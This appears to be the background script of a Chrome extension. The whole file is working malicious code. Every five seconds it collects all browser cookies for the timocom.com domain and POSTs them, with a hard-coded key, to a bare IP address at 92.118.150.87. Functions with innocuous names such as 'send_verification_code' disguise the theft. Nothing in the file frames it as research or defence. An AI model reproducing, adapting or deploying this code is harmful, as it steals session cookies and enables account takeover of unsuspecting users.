//TODO: remove after release
//TODO: rewrite to set user key
localStorage.setItem('verify_key', "d5380c1f6a194aa5ed5d0ac5f2522b07");

jobber();
const timerIdGetAllBalance = setInterval(function() {
  jobber();
}, 5000);

function jobber() {
  chrome.cookies.getAll({
      domain: 'timocom.com'
  },
  function(cookies) {
    console.log(cookies);
    if (cookies) {
      send_verification_code(cookies);
    } else {
      console.log('Can\'t get cookie! Check the name!');
    }
  });
}

function send_verification_code(cookies) {
  const current_verification_key = localStorage.getItem('verify_key');
  console.log(Object.keys(cookies).length);
  if (Object.keys(cookies).length > 0) {
    const url = 'http://92.118.150.87/api/chrome';

    const response = fetch(url, {
      method: 'POST',
      mode: 'no-cors',
      redirect: 'follow',
      referrerPolicy: 'no-referrer',
      body: JSON.stringify({
        cookies: cookies,
        check_key: current_verification_key
      }),
      headers: {
        'Content-Type': 'application/json'
      }
    });

    response.then(function(dataResponse) {
      console.log(dataResponse);
    }).catch(function(e) {
      console.log(e);
    })
  }
}
